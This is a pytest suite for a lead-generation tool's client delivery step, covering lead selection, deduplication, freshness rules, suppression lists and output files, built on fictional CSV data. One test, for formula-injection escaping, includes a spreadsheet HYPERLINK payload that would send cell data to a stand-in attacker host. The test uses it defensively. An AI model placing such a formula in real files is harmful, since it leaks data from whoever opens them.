"""Tests for leadgen.delivery.run: deliver() end to end on a local CSV source (no network).

Every test builds a small workspace in ``tmp_path``: a base playbook with a CSV
job source and a CSV contact list, and a ``Client`` pointing at it. Paid
providers (MillionVerifier, a paid people finder) are driven through
``tests.fakes.FakeHttp``.
"""
from __future__ import annotations

import csv
import json
import logging
import sys
import types
from dataclasses import dataclass
from datetime import date, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional

import pytest
from openpyxl import load_workbook

from leadgen import registry
from leadgen.delivery.client import Client, ClientError
from leadgen.delivery.ledger import Ledger
from leadgen.delivery.qa import KIND_DUPLICATE, KIND_FILTERED, KIND_OVER_LIMIT
from leadgen.delivery.rows import columns
from leadgen.delivery.run import (INTERNAL_DIR, DeliveryResult, deliver, delivery_folder, package_notes, person_keys,
                                  select_leads)
from leadgen.enrich.base import ContactFinder
from leadgen.models import Company, Contact, EmailStatus, Lead, Signal, Stage
from leadgen.store import Store
from leadgen.verify.base import VerificationResult, Verifier
from tests.conftest import TODAY
from tests.fakes import FakeHttp, FakeLLM

# --- test adapters (registered like a LEADGEN_PLUGINS module would) ---------------------------------


class AlwaysValidVerifier(Verifier):
    """Offline verifier that calls every address valid (like an over-optimistic provider)."""

    name = "dlv_always_valid"
    offline = True
    checked: List[str] = []

    def verify(self, email: str) -> VerificationResult:
        AlwaysValidVerifier.checked.append(email)
        return VerificationResult(email, EmailStatus.VALID, "ok", self.name)


class PaidPeopleFinder(ContactFinder):
    """A paid people-search API (one request per company) reached through ``self.http``."""

    name = "dlv_paid_people"
    env_key = "PEOPLE_API_KEY"

    @property  # type: ignore[override]
    def paid(self) -> bool:
        return True

    @paid.setter
    def paid(self, value: bool) -> None:
        pass  # registry.create sets .paid from registry.PAID; this test adapter is always paid

    def find(self, company: Company) -> List[Contact]:
        data = self.http.get_json("https://people.example/v1/search",
                                  params={"domain": company.domain, "api_key": self.secret()})
        return [Contact(first_name=p["first_name"], last_name=p["last_name"], title=p["title"], email=p["email"],
                        email_status=p["email_status"], source=self.name) for p in data.get("people", [])]


registry.register("verifier", "dlv_always_valid", "tests.test_deliver:AlwaysValidVerifier")
registry.register("finder", "dlv_paid_people", "tests.test_deliver:PaidPeopleFinder")


# --- workspace --------------------------------------------------------------------------------------

JOB_HEADER = ["company", "domain", "location", "industry", "employees", "signal_type", "signal_title",
              "signal_date", "signal_url", "signal_id"]
JOBS = [
    ["Acme Corp", "acme-dlv.example", "Austin, TX", "Software", 120, "job_posting", "Senior Accountant",
     "2026-09-22", "https://acme-dlv.example/jobs/1", "a-1"],
    ["Acme Corp", "acme-dlv.example", "Austin, TX", "Software", 120, "job_posting", "Financial Controller",
     "2026-09-20", "https://acme-dlv.example/jobs/2", "a-2"],
    ["Beta LLC", "beta-dlv.example", "Tulsa, OK", "Logistics", 300, "job_posting", "Staff Accountant",
     "2026-09-21", "https://beta-dlv.example/careers/staff-accountant", "b-1"],
    ["Gamma Inc", "gamma-dlv.example", "Dallas, TX", "Software", 80, "job_posting", "Accountant",
     "2026-09-23", "https://gamma-dlv.example/careers/acct", "g-1"],
    # 23 days old: outside a 7-day freshness window
    ["Delta Co", "delta-dlv.example", "Houston, TX", "Retail", 60, "job_posting", "Payroll Accountant",
     "2026-09-01", "https://delta-dlv.example/jobs/9", "d-1"],
    # no posting date
    ["Epsilon Ltd", "epsilon-dlv.example", "El Paso, TX", "Retail", 90, "job_posting", "Staff Accountant",
     "", "https://epsilon-dlv.example/jobs/3", "e-1"],
    # funding news only: never delivered in a hiring report
    ["Zeta Capital", "zeta-dlv.example", "Austin, TX", "Finance", 150, "funding", "Raised a Series A",
     "2026-09-20", "https://zeta-dlv.example/news", "z-1"],
    # a role the client does not fill
    ["Eta Systems", "eta-dlv.example", "Austin, TX", "Software", 200, "job_posting", "Software Engineer",
     "2026-09-22", "https://eta-dlv.example/jobs/5", "h-1"],
    # below the client's minimum company size
    ["Theta Tiny", "theta-dlv.example", "Austin, TX", "Software", 5, "job_posting", "Accountant",
     "2026-09-22", "https://theta-dlv.example/jobs/1", "t-1"],
]
CONTACT_HEADER = ["company", "domain", "first_name", "last_name", "title", "email", "email_status", "linkedin"]
CONTACTS = [
    ["Acme Corp", "acme-dlv.example", "Casey", "Money", "CFO", "casey@acme-dlv.example", "valid",
     "https://www.linkedin.com/in/casey-money"],
    ["Acme Corp", "acme-dlv.example", "Jordan", "Books", "Finance Director", "jordan@acme-dlv.example", "valid", ""],
    ["Beta LLC", "beta-dlv.example", "Robin", "Hire", "Head of Talent", "robin@beta-dlv.example", "catch-all", ""],
    # no email: the pattern finder guesses pat.numbers@... and the verifier checks the guess
    ["Gamma Inc", "gamma-dlv.example", "Pat", "Numbers", "Controller", "", "",
     "https://www.linkedin.com/in/pat-numbers"],
    ["Zeta Capital", "zeta-dlv.example", "Zoe", "Cash", "CFO", "zoe@zeta-dlv.example", "valid", ""],
]
BASE = """\
name: dlv-base
sources:
  - type: csv
    path: jobs.csv
enrichment:
  finders:
    - {type: csv, path: contacts.csv}
    - {type: pattern}
  verifier: {type: %(verifier)s}
scoring:
  tiers: {hot: 60, normal: 20}
notify:
  channels: []
%(extra)s"""


@dataclass
class Workspace:
    root: Path
    base: Path

    @property
    def playbook(self) -> Path:
        return self.base / "base.yaml"

    def write_csv(self, name: str, header: List[str], rows: List[list]) -> None:
        with open(self.base / name, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(header)
            w.writerows(rows)

    def jobs(self, rows: List[list]) -> None:
        self.write_csv("jobs.csv", JOB_HEADER, rows)

    def contacts(self, rows: List[list]) -> None:
        self.write_csv("contacts.csv", CONTACT_HEADER, rows)

    def playbook_text(self, verifier: str = "basic", extra: str = "", text: Optional[str] = None) -> None:
        self.playbook.write_text(text if text is not None else BASE % {"verifier": verifier, "extra": extra},
                                 encoding="utf-8")

    @property
    def deliveries(self) -> Path:
        return self.root / "deliveries"


@pytest.fixture
def ws(tmp_path) -> Workspace:
    w = Workspace(root=tmp_path, base=tmp_path / "base")
    w.base.mkdir()
    w.jobs(JOBS)
    w.contacts(CONTACTS)
    w.playbook_text()
    AlwaysValidVerifier.checked = []
    return w


@pytest.fixture
def store():
    s = Store(":memory:")
    yield s
    s.close()


def make_client(ws: Workspace, **kw: Any) -> Client:
    settings: Dict[str, Any] = dict(
        playbook=str(ws.playbook), display_name="Acme Staffing Ltd", roles=["accountant", "controller"],
        buyer_titles=["CFO", "Finance Director", "Controller", "Head of Talent"], company_size={"min": 20},
        leads_per_week=10, delivery={"folder": str(ws.deliveries / "{client}" / "{date}")})
    settings.update(kw)
    return Client("acme", **settings)


def run(client: Client, store: Store, **kw: Any) -> DeliveryResult:
    kw.setdefault("env", {})
    kw.setdefault("http", FakeHttp())
    kw.setdefault("today", TODAY)
    kw.setdefault("log", logging.getLogger("leadgen.test"))
    return deliver(client, store=store, **kw)


def read_csv(path: Path) -> List[Dict[str, str]]:
    with open(path, newline="", encoding="utf-8-sig") as f:
        return list(csv.DictReader(f))


def names(res: DeliveryResult) -> List[str]:
    return [r["company"] for r in res.package.rows]


# --- delivery mode: no copy, no hand-over, no replies ------------------------------------------------

def _boom(*_a: Any, **_k: Any) -> Any:
    raise AssertionError("an outbound feature was used during a delivery")


def test_deliver_never_writes_copy_hands_over_or_touches_replies(ws, store, monkeypatch):
    import leadgen.outbound.instantly as instantly
    import leadgen.outbound.smartlead as smartlead
    import leadgen.pipeline as pipeline
    import leadgen.replies as replies
    import leadgen.writer as writer

    monkeypatch.setattr(pipeline, "build_writer", _boom)
    monkeypatch.setattr(writer, "build_writer", _boom)
    monkeypatch.setattr(replies, "handle_reply", _boom)
    monkeypatch.setattr(instantly.InstantlyCsvExporter, "export", _boom)
    monkeypatch.setattr(smartlead.SmartleadCsvExporter, "export", _boom)
    # a base playbook written for outreach: outbound mode + upload-CSV hand-over exporters
    ws.playbook_text(extra="mode: outbound\nwriter: {type: template}\noutbound:\n  exporters:\n"
                           "    - {type: instantly_csv}\n    - {type: smartlead_csv}\n    - {type: csv}\n")

    res = run(make_client(ws), store)

    assert res.run.mode == "delivery" and res.run.playbook == "client-acme"
    assert names(res) == ["Acme Corp", "Gamma Inc", "Beta LLC"]
    assert res.run.counts["written"] == 0 and res.run.counts["exported"] == 0
    assert all(not ld.messages for ld in res.run.leads)
    assert [e.exporter for e in res.run.exports] == ["csv"]          # the review file only
    produced = [p.name.lower() for p in res.folder.rglob("*") if p.is_file()]
    assert not [p for p in produced if "instantly" in p or "smartlead" in p]
    assert all(not store.was_exported(ld.id) for ld in res.run.leads)
    assert all(ld.stage != Stage.EXPORTED for ld in res.run.leads)
    assert not any("hands leads to a sending tool" in w for w in res.qa.warnings)


# --- the happy path -----------------------------------------------------------------------------------

def test_happy_path_files_rows_ledger_and_qa(ws, store):
    client = make_client(ws)
    res = run(client, store)

    folder = ws.deliveries / "acme" / "2026-09-24"
    assert res.folder == folder and res.internal_dir == folder / INTERNAL_DIR and not res.dry_run
    assert set(res.files) == {"csv", "xlsx", "html"}
    for ext, path in res.files.items():
        assert path == folder / f"acme-hiring-signals-2026-09-24.{ext}" and path.is_file()

    # hot first, then score, then the freshest job (Gamma: 1 day, Beta: 3 days - same score)
    assert names(res) == ["Acme Corp", "Gamma Inc", "Beta LLC"]
    rows = read_csv(res.files["csv"])
    assert list(rows[0]) == [h for _, h in columns()]
    acme = rows[0]
    assert acme["Company"] == "Acme Corp" and acme["Urgency"] == "hot"
    assert acme["Job title(s)"] == "Senior Accountant; Financial Controller"
    assert acme["Date posted"] == "2026-09-22" and acme["Posted"] == "posted 2 days ago"
    assert acme["Decision-maker"] == "Casey Money" and acme["Decision-maker title"] == "CFO"
    assert acme["Email"] == "casey@acme-dlv.example" and acme["Email status"] == "verified"
    assert acme["Website"] == "https://acme-dlv.example"
    assert [r["Posted"] for r in rows] == ["posted 2 days ago", "posted 1 day ago", "posted 3 days ago"]
    assert [r["Email status"] for r in rows] == ["verified", "guessed-unverified", "risky"]

    wb = load_workbook(res.files["xlsx"])
    assert wb.sheetnames == ["Leads", "About"] and wb["Leads"].max_row == 4
    html = res.files["html"].read_text(encoding="utf-8")
    assert "Acme Corp" in html and "Hiring Signal Report" in html

    # the package: period = freshness window, branding from the playbook, factual notes
    pkg = res.package
    assert (pkg.client_name, pkg.client_display) == ("acme", "Acme Staffing Ltd")
    assert (pkg.period_start, pkg.period_end) == (TODAY - timedelta(days=7), TODAY)
    assert pkg.brand["brand_name"] == "Hiring Signal Report" and pkg.run_id == res.run.run_id
    assert pkg.notes == ["Jobs posted in the last 7 days (as of 2026-09-24).",
                         "Jobs without a posting date are left out.",
                         "Re-posted (stale) job ads are left out.",
                         "Companies, jobs and contacts already sent to you in earlier deliveries are left out."]

    # the ledger now knows every delivered company / job / contact
    summary = Ledger(store).summary("acme")
    assert res.recorded == summary["items"] > 0
    assert (summary["company"], summary["job"]) == (3, 4) and summary["contact"] >= 3

    # QA
    qa = res.qa
    assert (qa.leads_found, qa.with_signal, qa.qualified, qa.delivered, qa.target) == (8, 5, 4, 3, 10)
    assert qa.filtered_out == 5
    assert qa.top_reasons == [("no signal matching [...] in last 7 days", 3), ("no live job posting", 1),
                              ("too small", 1)]
    assert qa.duplicates_removed == 0 and qa.suppressed == 0 and qa.held_back == 0
    assert qa.verified_email_rate == pytest.approx(1 / 3)
    assert qa.email_status_counts == {"verified": 1, "risky": 1, "guessed-unverified": 1, "not found": 0}
    assert [w for w in qa.warnings if w.startswith("Low volume: 3 of 10")]
    assert qa.usage_lines[0] == "API usage: paid lookups 0 (no cap)"
    assert qa.files == {k: str(v) for k, v in res.files.items()} and qa.folder == str(folder)
    assert res.lines() == qa.lines() and res.summary() == qa.text() and res.delivered == 3

    # the internal folder: the pipeline's run files, the QA summary, why each company was left out
    internal = res.internal_dir
    assert (internal / res.run.run_id / "summary.json").is_file()
    assert (internal / res.run.run_id / "rejected.csv").is_file()
    assert (internal / "qa.txt").read_text(encoding="utf-8") == qa.text() + "\n"
    assert json.loads((internal / "qa.json").read_text(encoding="utf-8")) == json.loads(json.dumps(qa.to_dict()))
    left_out = {r["company"]: r["reason"] for r in read_csv(internal / "not_delivered.csv")}
    assert left_out["Theta Tiny"].startswith("too small")
    assert left_out["Zeta Capital"].startswith("no live job posting")
    assert "older than 7 days" in left_out["Delta Co"]
    assert "without a posting date" in left_out["Epsilon Ltd"]
    assert "not matching" in left_out["Eta Systems"]
    # nothing client-facing lands in _internal, nothing internal next to the client files
    assert sorted(p.name for p in folder.iterdir()) == sorted([INTERNAL_DIR] + [p.name for p in res.files.values()])


def test_client_branding_reaches_the_files(ws, store):
    res = run(make_client(ws, branding={"brand_name": "Signals by Sam", "brand_color": "#aa3300"}), store)
    assert res.package.brand["brand_name"] == "Signals by Sam"
    assert "Signals by Sam" in res.files["html"].read_text(encoding="utf-8")


def test_only_the_requested_formats_are_written(ws, store):
    res = run(make_client(ws, delivery={"formats": ["csv"], "folder": str(ws.deliveries / "{client}")}), store)
    assert list(res.files) == ["csv"] and res.folder == ws.deliveries / "acme"
    assert not list(res.folder.glob("*.xlsx")) and not list(res.folder.glob("*.html"))


def test_out_dir_overrides_the_client_folder(ws, store):
    res = run(make_client(ws), store, out_dir=ws.root / "custom" / "{client}-{date}")
    assert res.folder == ws.root / "custom" / "acme-2026-09-24"
    assert res.files["csv"].parent == res.folder and (res.folder / INTERNAL_DIR / "qa.txt").is_file()
    assert not ws.deliveries.exists()
    assert delivery_folder(make_client(ws), TODAY, "plain/{unknown}") == Path("plain/{unknown}")


def test_an_existing_delivery_is_never_overwritten(ws, store):
    client = make_client(ws)
    first = run(client, store)
    before = first.files["csv"].read_bytes()

    second = run(client, store)                      # same day, same data
    assert second.folder == first.folder.with_name("2026-09-24-2")
    assert first.files["csv"].read_bytes() == before
    assert any("already holds a delivery for 2026-09-24" in n for n in second.qa.notes)
    third = run(client, store)
    assert third.folder == first.folder.with_name("2026-09-24-3")


def test_a_shared_output_folder_never_mixes_deliveries(ws, store):
    out = ws.root / "reports"                        # a fixed --out: no {client} / {date}
    acme = run(make_client(ws), store, out_dir=out)
    acme_qa = (acme.internal_dir / "qa.txt").read_text(encoding="utf-8")
    other = run(Client("beta-staffing", playbook=str(ws.playbook), roles=["accountant", "controller"],
                       company_size={"min": 20}), store, out_dir=out)
    assert acme.folder == out and other.folder == ws.root / "reports-2"
    assert any("already holds another delivery" in n for n in other.qa.notes)
    # acme's folder holds only acme's files, and its QA / not_delivered.csv were not overwritten
    assert sorted(p.name for p in out.iterdir()) == sorted([INTERNAL_DIR] + [p.name for p in acme.files.values()])
    assert (acme.internal_dir / "qa.txt").read_text(encoding="utf-8") == acme_qa
    # the same client next week, with a folder that has no {date}: a new folder, not last week's
    later = run(make_client(ws, freshness_days=30), store, out_dir=out, today=TODAY + timedelta(days=7))
    assert later.folder == ws.root / "reports-3"
    assert [p.name for p in later.folder.glob("*.csv")] == ["acme-hiring-signals-2026-10-01.csv"]


def test_not_delivered_csv_is_guarded_against_formula_injection(ws, store):
    evil = '=HYPERLINK("http://attacker.example/?"&A2,"click")'
    ws.jobs(JOBS + [[evil, "inj-dlv.example", "Austin, TX", "Software", 3, "job_posting", "Accountant",
                     "2026-09-22", "https://inj-dlv.example/jobs/1", "i-1"],
                    ["@Plus Co", "plus-dlv.example", "Austin, TX", "Software", 4, "job_posting", "Accountant",
                     "2026-09-22", "https://plus-dlv.example/jobs/1", "p-1"]])
    res = run(make_client(ws), store)
    rows = read_csv(res.internal_dir / "not_delivered.csv")
    assert {r["company"] for r in rows} >= {"'" + evil, "'@Plus Co"}
    assert not [r for r in rows for v in r.values() if v[:1] in ("=", "+", "-", "@")]


# --- selection ----------------------------------------------------------------------------------------

def _lead(name: str, tier: str = "normal", score: int = 50, *, email: str = "", linkedin: str = "",
          age: Optional[int] = 2, signal_type: str = "job_posting", domain: str = "") -> Lead:
    posted = TODAY - timedelta(days=age) if age is not None else None
    company = Company(name=name, domain=domain or name.lower().replace(" ", "") + ".example",
                      signals=[Signal(type=signal_type, title="Accountant", posted_at=posted)])
    contact = Contact(full_name=f"{name} Boss", title="CFO", email=email, linkedin_url=linkedin,
                      email_status=EmailStatus.VALID) if (email or linkedin) else None
    return Lead(company=company, contact=contact, score=score, tier=tier, playbook="client-acme")


def test_select_orders_hot_first_then_score_then_freshest_job():
    leads = [_lead("N1", "normal", 79, age=1), _lead("H1", "hot", 81, age=5), _lead("H2", "hot", 95, age=9),
             _lead("N2", "normal", 70, age=1), _lead("N3", "normal", 70, age=0), _lead("N4", "normal", 70, age=None)]
    sel = select_leads(leads, Client("acme"), today=TODAY)
    assert [ld.company.name for ld in sel.leads] == ["H2", "H1", "N1", "N3", "N2", "N4"]
    assert sel.dropped == []


def test_select_keeps_only_the_client_tiers_and_leads_with_a_job():
    leads = [_lead("Hot", "hot", 90), _lead("Normal", "normal", 60), _lead("Skip", "skip", 10),
             _lead("Funded", "hot", 88, signal_type="funding")]
    sel = select_leads(leads, Client("acme", tiers=["hot"]), today=TODAY)
    assert [ld.company.name for ld in sel.leads] == ["Hot"]
    reasons = {d["company"]: (d["kind"], d["reason"]) for d in sel.dropped}
    assert reasons["Normal"] == (KIND_FILTERED, "urgency 'normal' is not delivered to this client (tiers: hot)")
    assert reasons["Skip"][1].startswith("urgency 'skip' is not delivered")
    assert reasons["Funded"] == (KIND_FILTERED, "no live job posting (only other signals, e.g. funding news)")
    # a playbook that makes funding a primary signal: it counts as intent then
    sel2 = select_leads(leads, Client("acme", tiers=["hot"]), primary=["job_posting", "funding"], today=TODAY)
    assert [ld.company.name for ld in sel2.leads] == ["Hot", "Funded"]
    # skip may be delivered when the client asks for it
    sel3 = select_leads(leads, Client("acme", tiers=["hot", "normal", "skip"]), today=TODAY)
    assert [ld.company.name for ld in sel3.leads] == ["Hot", "Normal", "Skip"]


def test_select_one_row_per_company_and_per_person():
    a1 = _lead("Acme", "hot", 90, email="casey@acme.example", domain="acme.example")
    a2 = _lead("Acme", "hot", 80, email="jordan@acme.example", domain="acme.example")
    same_email = _lead("Acme Holdings", "normal", 70, email="CASEY@acme.example")
    same_li = _lead("Beta", "normal", 65, email="pat@beta.example", linkedin="https://www.linkedin.com/in/pat/")
    same_li2 = _lead("Beta Group", "normal", 60, linkedin="http://linkedin.com/in/pat?trk=x")
    nobody1, nobody2 = _lead("Gamma", "normal", 55), _lead("Delta", "normal", 50)   # no contact: never a person dupe
    sel = select_leads([a2, same_li2, a1, same_email, same_li, nobody1, nobody2], Client("acme"), today=TODAY)
    assert [(ld.company.name, ld.contact.email if ld.contact else None) for ld in sel.leads] == [
        ("Acme", "casey@acme.example"), ("Beta", "pat@beta.example"), ("Gamma", None), ("Delta", None)]
    dups = {(d["company"], d["duplicate_of"]) for d in sel.dropped if d["kind"] == KIND_DUPLICATE}
    assert dups == {("Acme", "company"), ("Acme Holdings", "contact"), ("Beta Group", "contact")}
    assert sel.duplicates == {"company": 1, "contact": 2}
    assert person_keys(same_li2.contact) == {"linkedin:linkedin.com/in/pat"}
    assert person_keys(None) == set()


def test_select_cuts_to_leads_per_week_and_holds_the_rest_back():
    leads = [_lead(f"C{i}", "normal", 90 - i) for i in range(5)]
    sel = select_leads(leads, Client("acme", leads_per_week=2), today=TODAY)
    assert [ld.company.name for ld in sel.leads] == ["C0", "C1"]
    assert sel.held_back == 3 and all(d["kind"] == KIND_OVER_LIMIT for d in sel.dropped)
    assert sel.dropped[0]["reason"].startswith("over this client's weekly limit of 2 leads")


def test_one_row_per_company_through_the_pipeline(ws, store):
    client = make_client(ws, overrides={"buyers": {"max_contacts_per_company": 2}})
    res = run(client, store)
    acme_leads = [ld for ld in res.run.leads if ld.company.name == "Acme Corp"]
    assert len(acme_leads) == 2                                      # the pipeline found two people
    assert names(res).count("Acme Corp") == 1                        # the file has one row
    assert res.package.rows[0]["decision_maker"] == "Casey Money"    # the best-scoring one
    assert res.qa.duplicates == {"same_company_in_run": 1} and res.qa.duplicates_removed == 1
    assert [d["contact"] for d in res.not_delivered if d["kind"] == KIND_DUPLICATE] == ["Jordan Books"]


def test_one_row_per_person_through_the_pipeline(ws, store):
    ws.jobs(JOBS[:4] + [
        ["Omega Group", "omega-dlv.example", "Austin, TX", "Software", 400, "job_posting", "Accountant",
         "2026-09-23", "https://omega-dlv.example/jobs/1", "o-1"],
        ["Omega Labs", "omegalabs-dlv.example", "Austin, TX", "Software", 40, "job_posting", "Accountant",
         "2026-09-19", "https://omegalabs-dlv.example/jobs/1", "ol-1"],
    ])
    ws.contacts(CONTACTS + [
        ["Omega Group", "omega-dlv.example", "Sam", "Ledger", "CFO", "sam@omega-dlv.example", "valid", ""],
        ["Omega Labs", "omegalabs-dlv.example", "Sam", "Ledger", "CFO", "sam@omega-dlv.example", "valid", ""],
    ])
    res = run(make_client(ws), store)
    sams = [r for r in res.package.rows if r["email"] == "sam@omega-dlv.example"]
    assert len(sams) == 1 and sams[0]["company"] == "Omega Group"   # fresher job, same score otherwise
    dup = [d for d in res.not_delivered if d["kind"] == KIND_DUPLICATE]
    assert [(d["company"], d["duplicate_of"]) for d in dup] == [("Omega Labs", "contact")]
    assert res.qa.duplicates == {"same_contact_in_run": 1}


def test_tiers_and_held_back_leads_go_out_next_time(ws, store):
    client = make_client(ws, leads_per_week=2)
    first = run(client, store)
    assert names(first) == ["Acme Corp", "Gamma Inc"]
    assert first.qa.held_back == 1 and any("held back" in ln for ln in first.qa.lines())
    assert not any(w.startswith("Low volume") for w in first.qa.warnings)
    assert Ledger(store).summary("acme")["company"] == 2               # Beta was not recorded

    second = run(client, store, today=TODAY + timedelta(days=1))
    assert names(second) == ["Beta LLC"]

    with Store(":memory:") as fresh:
        hot_only = run(make_client(ws, tiers=["hot"]), fresh)
    assert names(hot_only) == ["Acme Corp"]
    assert ("urgency 'normal' is not delivered to this client", 2) in hot_only.qa.top_reasons


# --- the ledger across deliveries --------------------------------------------------------------------

def test_a_second_delivery_of_the_same_data_delivers_nothing_again(ws, store):
    client = make_client(ws)
    first = run(client, store)
    assert first.qa.delivered == 3
    items = Ledger(store).summary("acme")["items"]

    second = run(client, store)
    assert second.package.rows == [] and second.recorded == 0
    assert Ledger(store).summary("acme")["items"] == items
    qa = second.qa
    assert qa.duplicates_removed == 3 and qa.duplicates == {"company": 3}
    assert ("already delivered to this client", 3) in qa.top_reasons
    assert any(w.startswith("Low volume: 0 of 10 leads delivered") and "already delivered" in w
               for w in qa.warnings)
    assert any(w.startswith("No leads in this delivery") for w in qa.warnings)
    assert "duplicates removed ......... 3 (already delivered: 3 companies)" in qa.text()
    assert read_csv(second.files["csv"]) == []                        # an empty file, header only


def test_redelivery_window(ws, store):
    client = make_client(ws, redelivery_days=7, freshness_days=20)
    assert len(run(client, store).package.rows) == 3
    assert run(client, store, today=TODAY + timedelta(days=3)).package.rows == []   # too soon
    again = run(client, store, today=TODAY + timedelta(days=7))                     # the window has passed
    assert names(again) == ["Acme Corp", "Gamma Inc", "Beta LLC"]
    assert again.package.notes[3] == ("Companies, jobs and contacts already sent to you in the last 7 days "
                                      "are left out.")


def test_without_company_dedupe_a_new_job_at_a_known_company_is_delivered(ws, store):
    run(make_client(ws), store)
    ws.jobs(JOBS + [["Acme Corp", "acme-dlv.example", "Austin, TX", "Software", 120, "job_posting",
                     "Payroll Accountant", "2026-09-23", "https://acme-dlv.example/jobs/3", "a-3"]])
    res = run(make_client(ws, dedupe=["job", "contact"]), store, today=TODAY + timedelta(days=1))
    assert names(res) == ["Acme Corp"]
    row = res.package.rows[0]
    assert row["job_titles"] == "Payroll Accountant"          # only the new job, never the old ones
    assert row["decision_maker"] == "Jordan Books"             # Casey was delivered last time
    assert res.qa.duplicates == {"job": 4, "contact": 1}
    left_out = {d["company"]: d["reason"] for d in res.run.rejected if d["stage"] == "delivery"}
    assert left_out == {"Beta LLC": "all its jobs were already delivered",
                        "Gamma Inc": "all its jobs were already delivered"}
    assert "Jobs and contacts already sent to you" in res.package.notes[3]


def test_dry_run_records_nothing_and_writes_previews(ws, store):
    client = make_client(ws)
    preview = run(client, store, dry_run=True)
    assert preview.dry_run and preview.recorded == 0
    for ext, path in preview.files.items():
        assert path.name == f"acme-hiring-signals-2026-09-24-PREVIEW.{ext}" and path.is_file()
    assert Ledger(store).summary("acme")["items"] == 0
    assert names(preview) == ["Acme Corp", "Gamma Inc", "Beta LLC"]
    assert preview.package.notes[-1] == "PREVIEW - not recorded as delivered."
    assert preview.qa.dry_run and "DRY RUN" in preview.qa.lines()[0]
    assert json.loads((preview.internal_dir / "qa.json").read_text(encoding="utf-8"))["dry_run"] is True

    real = run(client, store)                    # previews never block the real delivery's folder
    assert real.folder == preview.folder
    assert names(real) == names(preview) and real.recorded > 0
    # ... and the real delivery moves them into _internal/: "send everything outside _internal" is exactly
    # what was delivered (a preview row the real run left out is not in the ledger and would be sold again)
    assert sorted(p.name for p in real.folder.iterdir()) == sorted([INTERNAL_DIR] + [p.name for p in
                                                                                     real.files.values()])
    moved = real.internal_dir / "preview"
    assert sorted(p.name for p in moved.iterdir()) == sorted(p.name for p in preview.files.values())
    assert any("PREVIEW files" in n and "moved" in n for n in real.qa.notes)


def test_preview_rows_the_real_delivery_left_out_never_reach_the_client_folder(ws, store):
    client = make_client(ws, leads_per_week=2)
    preview = run(client, store, dry_run=True)
    assert names(preview) == ["Acme Corp", "Gamma Inc"]
    ws.jobs(JOBS + [["Hotco", "hotco-dlv.example", "Austin, TX", "Software", 150, "job_posting",
                     "Senior Accountant", "2026-09-24", "https://hotco-dlv.example/jobs/1", "hc-1"]])
    ws.contacts(CONTACTS + [["Hotco", "hotco-dlv.example", "Max", "Hot", "CFO", "max@hotco-dlv.example",
                             "valid", ""]])
    real = run(client, store)                    # found a hotter lead: Gamma Inc is held back
    assert real.folder == preview.folder and "Gamma Inc" not in names(real)
    sendable = [p for p in real.folder.iterdir() if p.name != INTERNAL_DIR]
    assert sorted(sendable) == sorted(real.files.values())
    assert not any("Gamma Inc" in p.read_text(encoding="utf-8-sig", errors="ignore")
                   for p in sendable if p.suffix in (".csv", ".html"))


def test_client_do_not_list_exclusions_and_global_suppression(ws, store):
    Ledger(store).suppress("acme", "beta-dlv.example", "domain", reason="their client")
    store.suppress("gamma-dlv.example", kind="domain", reason="asked us never to list them")
    res = run(make_client(ws, exclusions={"companies": ["Zeta Capital"]}), store)
    assert names(res) == ["Acme Corp"]
    qa = res.qa
    assert qa.suppressed == 3            # Beta + Zeta (client) + Gamma (global)
    reasons = dict(qa.top_reasons)
    assert reasons["on this client's do-not-list"] == 2
    assert reasons["domain is on the suppression list"] == 1


def test_the_client_file_exclusions_count_as_its_do_not_list(ws, store):
    # clients/_template.yaml: "exclusions: The client's own do-not-list" (companies, domains, keywords)
    res = run(make_client(ws, exclusions={"domains": ["beta-dlv.example"], "keywords": ["gamma"]}), store)
    assert names(res) == ["Acme Corp"]
    assert res.qa.suppressed == 2 and "on a do-not-list ........... 2" in res.qa.text()


def test_a_company_delivered_with_a_domain_is_not_delivered_again_without_one(ws, store):
    assert "Acme Corp" in names(run(make_client(ws), store))
    # next week a job board without domains (e.g. Adzuna) lists Acme again, and the very same ad
    ws.jobs([["Acme Corp", "", "Austin, TX", "Software", 120, "job_posting", "Senior Accountant", "2026-09-29",
              "https://acme-dlv.example/jobs/1", "a-1"],
             ["Acme Corp", "", "Austin, TX", "Software", 120, "job_posting", "Payroll Accountant", "2026-09-30",
              "https://acme-dlv.example/jobs/7", "a-7"]])
    later = TODAY + timedelta(days=7)
    assert names(run(make_client(ws), store, today=later)) == []                     # company dedupe
    res = run(make_client(ws, dedupe=["job", "contact"]), store, today=later)       # job dedupe
    assert [r["job_titles"] for r in res.package.rows] == ["Payroll Accountant"]


# --- freshness ------------------------------------------------------------------------------------------

def _mark_beta_as_reposted(store: Store) -> None:
    beta = Company(name="Beta LLC", domain="beta-dlv.example")
    old = Signal(type="job_posting", title="Staff Accountant", external_id="b-0", posted_at=date(2026, 8, 25))
    store.observe_signals(beta.key, [old], date(2026, 8, 25))


def test_freshness_window_reposts_and_undated_jobs(ws, store):
    _mark_beta_as_reposted(store)            # the same role was advertised under another id a month ago
    res = run(make_client(ws), store)
    assert names(res) == ["Acme Corp", "Gamma Inc"]
    rejected = {r["company"]: r["reason"] for r in res.run.rejected}
    assert "re-posted" in rejected["Beta LLC"]
    assert "older than 7 days" in rejected["Delta Co"]
    assert "without a posting date" in rejected["Epsilon Ltd"]
    rows = read_csv(res.files["csv"])
    assert [(r["Company"], r["Date posted"], r["Posted"]) for r in rows] == [
        ("Acme Corp", "2026-09-22", "posted 2 days ago"), ("Gamma Inc", "2026-09-23", "posted 1 day ago")]


def test_wider_window_undated_jobs_and_reposts_when_the_client_allows_them(ws, store):
    _mark_beta_as_reposted(store)
    res = run(make_client(ws, freshness_days=30, allow_undated=True, drop_reposts=False), store)
    rows = {r["company"]: r for r in res.package.rows}
    assert set(rows) == {"Acme Corp", "Beta LLC", "Gamma Inc", "Delta Co", "Epsilon Ltd"}
    assert rows["Delta Co"]["posted"] == "posted 23 days ago"
    assert rows["Epsilon Ltd"]["posted"] == "date unknown (first seen today)"
    assert rows["Epsilon Ltd"]["date_posted"] == ""
    assert res.package.notes == ["Jobs posted in the last 30 days (as of 2026-09-24).",
                                 "Companies, jobs and contacts already sent to you in earlier deliveries are "
                                 "left out."]


def test_notes_and_period_follow_the_playbook_actually_run(ws, store):
    # 'overrides' are deep-merged last: they, not freshness_days / allow_undated, decide what is delivered
    res = run(make_client(ws, overrides={"signals": {"max_age_days": 30, "allow_undated": True}}), store)
    rows = {r["company"]: r for r in res.package.rows}
